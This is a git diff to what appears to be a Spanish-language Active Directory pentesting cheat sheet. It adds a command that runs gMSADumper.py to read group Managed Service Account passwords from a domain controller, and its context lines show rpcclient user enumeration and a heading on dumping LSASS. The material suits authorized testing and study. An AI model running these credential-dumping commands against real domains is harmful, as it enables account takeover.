@@ -499,6 +499,11 @@ for rid in $(rpcclient -U 'dominio.local\user%password' IP -c 'enumdomusers' | g
 ```
 Get-ADUser -Filter * | select name
 ```
+### ReadGMSAPassword
+```
+python3 gMSADumper.py -u 'user' -p 'password' -l IP -d domain.local 
+```
+
 ### Dumpear LSASS
 Obtener el ID del proceso
 ```
